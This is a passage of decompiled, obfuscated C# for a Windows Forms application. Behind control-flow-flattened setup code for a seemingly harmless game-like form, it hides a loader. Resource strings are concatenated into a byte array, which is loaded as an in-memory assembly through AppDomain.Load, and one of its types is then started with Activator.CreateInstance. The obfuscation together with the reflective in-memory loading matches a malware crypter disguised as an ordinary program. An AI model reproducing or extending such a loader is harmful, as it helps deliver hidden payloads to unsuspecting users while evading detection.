					num = (int)((num2 * 821907838) ^ 0x58A19460);
					continue;
				case 34u:
					num = ((int)num2 * -549387553) ^ 0x4B46992;
					continue;
				case 33u:
					num = (int)((num2 * 815633201) ^ 0x53D92FA2);
					continue;
				case 32u:
					Form1.smethod_70(ComMember, object_);
					num = (int)(num2 * 1302677540) ^ -2035261264;
					continue;
				case 31u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)(num2 * 2105287937) ^ -670505850;
					continue;
				case 30u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -578662745) ^ 0x56FF437E;
					continue;
				case 29u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -1599059618) ^ -2066757881;
					continue;
				case 28u:
					num = ((int)num2 * -326949200) ^ 0x391A6366;
					continue;
				case 27u:
					num = (int)((num2 * 1651370023) ^ 0x4AC72B8F);
					continue;
				case 26u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -486462125) ^ -977906315;
					continue;
				case 25u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -1444153063) ^ 0xD82E864;
					continue;
				case 24u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)((num2 * 880968683) ^ 0x14D90B41);
					continue;
				case 23u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = (int)((num2 * 1128244064) ^ 0x1DDC6E8);
					continue;
				case 22u:
					num = (int)((num2 * 373195900) ^ 0x1AE17652);
					continue;
				case 21u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1910081044) ^ 0x4F8AFAC3;
					continue;
				case 20u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)(num2 * 1633068361) ^ -1973644298;
					continue;
				case 19u:
					num = (int)((num2 * 1788927723) ^ 0x765E6C4F);
					continue;
				case 17u:
					num = ((int)num2 * -1820370920) ^ 0x28D49282;
					continue;
				case 16u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)(num2 * 973142243) ^ -582288024;
					continue;
				case 15u:
					button1 = Form1.smethod_53();
					richTextBox1 = Form1.smethod_54();
					num = ((int)num2 * -1950157522) ^ 0x2533CFC9;
					continue;
				case 14u:
					panel1 = Form1.smethod_55();
					num = ((int)num2 * -1211189682) ^ 0x6BF602B5;
					continue;
				case 13u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 1175280538) ^ -214228120;
					continue;
				case 12u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)(num2 * 145286226) ^ -1213930461;
					continue;
				case 11u:
					Form1.smethod_59((Control)(object)this);
					num = (int)(num2 * 873504295) ^ -1145051674;
					continue;
				case 10u:
					num = (int)(num2 * 562397678) ^ -1477730687;
					continue;
				case 9u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = ((int)num2 * -386966957) ^ 0x5BADB914;
					continue;
				case 8u:
					num = ((int)num2 * -2048163355) ^ -1009457430;
					continue;
				case 7u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -1260300248) ^ -791495132;
					continue;
				case 6u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)((num2 * 1646551811) ^ 0x2CF52CE);
					continue;
				case 5u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -1037674666) ^ -686168759;
					continue;
				case 4u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)(num2 * 1211004933) ^ -1218612122;
					continue;
				case 3u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -965839598) ^ 0x4C38DEC;
					continue;
				case 2u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -1130728692) ^ -800246912;
					continue;
				case 1u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = (int)(num2 * 780521906) ^ -503594933;
					continue;
				case 0u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -725596327) ^ 0xD0D9397;
					continue;
				default:
					return;
				case 18u:
					break;
				case 112u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		while (true)
		{
			int num = 1120794123;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4610DAF0u) % 3u)
				{
				case 1u:
					goto IL_0009;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0009:
				PerformTable(q);
				num = ((int)num2 * -576595940) ^ 0x4216393B;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = -16254751;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB1263014u) % 3u)
				{
				case 1u:
					goto IL_0003;
				case 2u:
					break;
				default:
					return result;
				}
				break;
				IL_0003:
				result = Form1.smethod_94(Form1.smethod_93(), Position);
				num = ((int)num2 * -1766653967) ^ -184377885;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		while (true)
		{
			int num = 2024662560;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x45D5696Cu) % 3u)
				{
				case 1u:
					goto IL_0003;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_0003:
				ComMember = Form1.smethod_95(Q3)[24];
				num = (int)(num2 * 1459091819) ^ -156711665;
			}
		}
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
